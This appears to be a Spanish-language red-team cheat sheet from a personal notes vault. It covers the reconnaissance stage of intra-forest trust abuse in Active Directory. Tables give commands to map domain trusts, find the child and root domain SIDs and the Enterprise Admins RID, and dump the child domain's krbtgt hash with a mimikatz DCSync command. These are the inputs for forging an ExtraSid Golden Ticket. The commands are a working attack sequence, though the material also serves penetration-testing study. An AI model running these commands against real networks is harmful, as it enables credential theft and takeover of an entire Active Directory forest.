---
aliases:
  - Intra-Forest Trust Recon
tags:
  - technique/discovery
  - asset/active-directory
  - env/windows
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Active Directory]]"
tertiary categories:
  - "[[Active Directory Explotación]]"
kind: SubCheatSheet
linked:
  - "[[Intra-Forest Trust Abuse]]"
---
# Intra-Forest Trust Abuse - Recon

> Mapear la jerarquía del bosque y reunir los insumos para forjar el ticket: SID del dominio hijo, krbtgt del hijo, SID del root + RID de Enterprise Admins.

---

## Mapear el Bosque

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `nltest /domain_trusts /all_trusts` | Todos los trusts y el dominio raíz | Mapa de la jerarquía. |
| `Get-DomainTrust` (PowerView) | Trusts con dirección/transitividad | Recon detallado. |
| `Get-ForestDomain` / `Get-DomainSID -Domain corp.local` | Dominios del forest + SID del root | Identificar el root. |
| `Get-DomainGroup 'Enterprise Admins' -Domain corp.local` | Grupo EA (vive en el root, RID 519) | Target de la escalada. |
^intra-recon-map

## Reunir Insumos (ya sos DA del hijo)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `lsadump::dcsync /domain:child.corp.local /user:child\krbtgt` | Hash krbtgt del dominio hijo | Insumo del Golden Ticket. |
| `Get-DomainSID -Domain child.corp.local` | SID del dominio hijo | Para el campo `/sid`. |
| `Get-DomainSID -Domain corp.local` (root) | SID del root → `<ROOT_SID>-519` (EA) | Para el ExtraSid. |
^intra-recon-inputs

---

> Forjar el ticket con SID History de Enterprise Admins: [[Intra-Forest Trust Abuse - ExtraSids]].
